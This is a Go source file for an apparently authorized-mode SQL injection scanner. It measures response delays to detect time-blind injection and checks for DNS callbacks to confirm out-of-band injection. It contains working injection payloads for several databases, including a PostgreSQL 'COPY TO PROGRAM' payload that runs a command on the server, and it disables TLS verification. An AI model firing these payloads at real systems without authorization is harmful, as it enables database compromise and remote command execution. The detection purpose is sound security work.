// Package sqli implements a time-blind SQL injection scanner with calibration-based
// timing analysis. Unlike sqlmap's simple threshold, this scanner:
//
//  1. Measures baseline latency (5 requests, takes median)
//  2. Injects SLEEP(3) — verifies delta > 2.5s over baseline
//  3. Confirms with SLEEP(5) — verifies delta tracks proportionally
//
// This dual-sleep confirmation eliminates false positives from slow servers,
// network jitter, or rate limiting. Only runs in authorized mode.
package sqli

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
)

const scannerName = "sqli"

// Payloads organized by database type. Each contains a SLEEP/WAITFOR/pg_sleep
// call that will be parameterized with the desired delay.
type payload struct {
	name    string // e.g., "mysql-sleep"
	dbType  string // mysql, postgres, mssql, sqlite
	prefix  string // characters before the sleep call
	sleepFn string // the sleep function template (%d = seconds)
	suffix  string // characters after the sleep call
}

var payloads = []payload{
	// MySQL
	{name: "mysql-sleep-quote", dbType: "mysql", prefix: "' OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
	{name: "mysql-sleep-num", dbType: "mysql", prefix: "1 OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
	{name: "mysql-benchmark", dbType: "mysql", prefix: "' OR BENCHMARK(10000000,SHA1('", sleepFn: "test", suffix: "'))-- -"},

	// PostgreSQL
	{name: "pg-sleep-quote", dbType: "postgres", prefix: "'; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},
	{name: "pg-sleep-num", dbType: "postgres", prefix: "1; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},

	// MSSQL
	{name: "mssql-waitfor-quote", dbType: "mssql", prefix: "'; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
	{name: "mssql-waitfor-num", dbType: "mssql", prefix: "1; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},

	// SQLite
	{name: "sqlite-like-glob", dbType: "sqlite", prefix: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(", sleepFn: "500000000", suffix: "))))-- -"},
}

// Paths and parameters commonly vulnerable to SQLi.
var probePaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"id", "page", "cat", "item"}},
	{"/api/v1/users", []string{"id", "user_id"}},
	{"/search", []string{"q", "query", "search", "keyword"}},
	{"/product", []string{"id", "pid", "product_id"}},
	{"/article", []string{"id", "article_id"}},
	{"/news", []string{"id", "nid"}},
	{"/login", []string{"username", "user"}},
}

// Scanner checks for time-blind SQL injection.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := authctx.HTTPClient(ctx)
	client = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		},
		Jar: client.Jar,
	}

	// Determine working scheme
	scheme := detectScheme(ctx, client, asset)
	if scheme == "" {
		return nil, nil
	}

	var findings []finding.Finding

	for _, pp := range probePaths {
		if ctx.Err() != nil {
			break
		}

		for _, param := range pp.params {
			if ctx.Err() != nil {
				break
			}

			baseURL := fmt.Sprintf("%s://%s%s?%s=1", scheme, asset, pp.path, param)

			// Step 1: Measure baseline latency
			baseline, err := measureBaseline(ctx, client, baseURL, 5)
			if err != nil {
				continue
			}

			// Step 2: Try time-based payloads
			for _, p := range payloads {
				if ctx.Err() != nil {
					break
				}

				// Skip non-timing payloads for the dual-sleep check
				if p.sleepFn == "test" || p.sleepFn == "500000000" {
					continue
				}

				// First probe: SLEEP(3)
				injected3 := buildPayload(p, 3)
				testURL3 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(injected3))
				latency3, err := timeRequest(ctx, client, testURL3)
				if err != nil {
					continue
				}

				delta3 := latency3 - baseline
				if delta3 < 2500*time.Millisecond {
					continue // not significantly slower
				}

				// Step 3: Confirm with SLEEP(5) — delta should be ~5s over baseline
				injected5 := buildPayload(p, 5)
				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(injected5))
				latency5, err := timeRequest(ctx, client, testURL5)
				if err != nil {
					continue
				}

				delta5 := latency5 - baseline
				if delta5 < 4500*time.Millisecond {
					continue // didn't track proportionally
				}

				// Both deltas confirmed — this is real SQLi
				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebSQLi,
					Module:   "surface",
					Scanner:  scannerName,
					Severity: finding.SeverityCritical,
					Title:    fmt.Sprintf("Time-blind SQL injection in %s parameter at %s", param, pp.path),
					Description: fmt.Sprintf(
						"Calibration-based timing analysis confirmed SQL injection. "+
							"Baseline: %s, SLEEP(3) delta: %s, SLEEP(5) delta: %s. "+
							"Database type: %s. Payload: %s",
						baseline.Round(time.Millisecond), delta3.Round(time.Millisecond),
						delta5.Round(time.Millisecond), p.dbType, p.name),
					Asset: asset,
					Evidence: map[string]any{
						"path":           pp.path,
						"parameter":      param,
						"payload":        p.name,
						"db_type":        p.dbType,
						"baseline_ms":    baseline.Milliseconds(),
						"sleep3_delta_ms": delta3.Milliseconds(),
						"sleep5_delta_ms": delta5.Milliseconds(),
					},
					ProofCommand: fmt.Sprintf(
						`time curl -sk '%s'  # should take ~3s longer than baseline`,
						testURL3),
					DiscoveredAt: time.Now(),
				})

				// One confirmed SQLi per parameter is enough
				break
			}

			// Try OOB-based detection if available
			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
				token := oobSrv.GenerateToken(fmt.Sprintf("sqli-%s-%s", pp.path, param))
				oobDomain := oobSrv.DNSHostname(token)

				oobPayloads := []string{
					fmt.Sprintf("' AND 1=LOAD_FILE('\\\\\\\\%s\\\\a')-- -", oobDomain),
					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s\\a'-- -", oobDomain),
				}

				for _, op := range oobPayloads {
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(op))
					_, _ = timeRequest(ctx, client, testURL)
				}

				// Check for OOB callback (brief wait)
				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
					findings = append(findings, finding.Finding{
						CheckID:  finding.CheckWebSQLi,
						Module:   "surface",
						Scanner:  scannerName,
						Severity: finding.SeverityCritical,
						Title:    fmt.Sprintf("OOB SQL injection confirmed in %s at %s", param, pp.path),
						Description: fmt.Sprintf(
							"Out-of-band DNS callback received from %s, confirming SQL injection. "+
								"Protocol: %s", cb.RemoteAddr, cb.Protocol),
						Asset: asset,
						Evidence: map[string]any{
							"path":        pp.path,
							"parameter":   param,
							"oob_token":   token,
							"callback_ip": cb.RemoteAddr,
							"protocol":    cb.Protocol,
						},
						DiscoveredAt: time.Now(),
					})
				}
			}
		}
	}

	return findings, nil
}

func buildPayload(p payload, seconds int) string {
	sleep := fmt.Sprintf(p.sleepFn, seconds)
	return p.prefix + sleep + p.suffix
}

// measureBaseline sends N requests and returns the median latency.
func measureBaseline(ctx context.Context, client *http.Client, url string, n int) (time.Duration, error) {
	var latencies []time.Duration
	for i := 0; i < n; i++ {
		d, err := timeRequest(ctx, client, url)
		if err != nil {
			return 0, err
		}
		latencies = append(latencies, d)
	}
	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	return latencies[len(latencies)/2], nil // median
}

// timeRequest measures how long an HTTP GET takes.
func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-sqli-scanner)")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return elapsed, err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	return elapsed, nil
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	// Strip port if present to determine default
	host := asset
	if idx := strings.LastIndex(asset, ":"); idx != -1 {
		host = asset[:idx]
	}
	_ = host

	for _, scheme := range []string{"https", "http"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		return scheme
	}
	return ""
}
